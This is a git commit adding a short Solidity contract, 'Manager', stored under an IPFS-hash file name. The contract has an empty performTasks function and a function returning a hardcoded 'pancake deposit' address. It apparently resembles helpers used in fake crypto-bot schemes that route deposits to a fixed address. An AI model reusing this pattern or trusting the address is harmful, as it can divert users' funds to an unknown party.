71abf4e66bb01b14e8dfa6003fa254eca71c6206
KaBoooM-AI <98593655+KaBoooM-AI@users.noreply.github.com>
2022-01-31 10:45:19 +0700

    Add files via upload

---
+++ QmPNgyPJp7m56LTamHjMkmWCAP1uCBmH8UzDxRDqTdqwX4.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x7c71957e2449a1c0b7CB1E22467B2Df890b18779;
+	}
+}
